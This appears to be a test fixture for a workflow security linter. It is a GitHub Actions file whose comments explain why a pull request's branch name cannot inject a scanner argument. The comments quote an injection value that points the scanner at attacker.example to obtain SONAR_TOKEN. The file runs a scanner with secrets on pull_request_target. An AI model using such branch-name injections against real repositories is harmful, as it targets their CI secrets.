@@ -1,0 +1,22 @@
+# situation: on pull_request_target, a step runs SonarSource's scanner with
+#   SONAR_TOKEN, and passes the name of the pull request's head branch in
+#   args after -Dsonar.pullrequest.branch=.
+# reason: no harm: a branch's name cannot hold a blank, and the scanner splits
+#   args at blanks, so the name stays the value of
+#   -Dsonar.pullrequest.branch and cannot add -Dsonar.host.url.
+# cause: the rule reads every value in args as one that can add an argument.
+# attack: the author of a pull request from a fork names the branch
+#   x-Dsonar.host.url=https://attacker.example.
+# attack-run-behavior: the scanner reads one argument
+#   -Dsonar.pullrequest.branch=x-Dsonar.host.url=https://attacker.example and
+#   sends SONAR_TOKEN to the server the workflow names.
+on: pull_request_target
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: SonarSource/sonarqube-scan-action@v4
+        env:
+          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}
+        with:
+          args: -Dsonar.pullrequest.branch=${{ github.head_ref }}
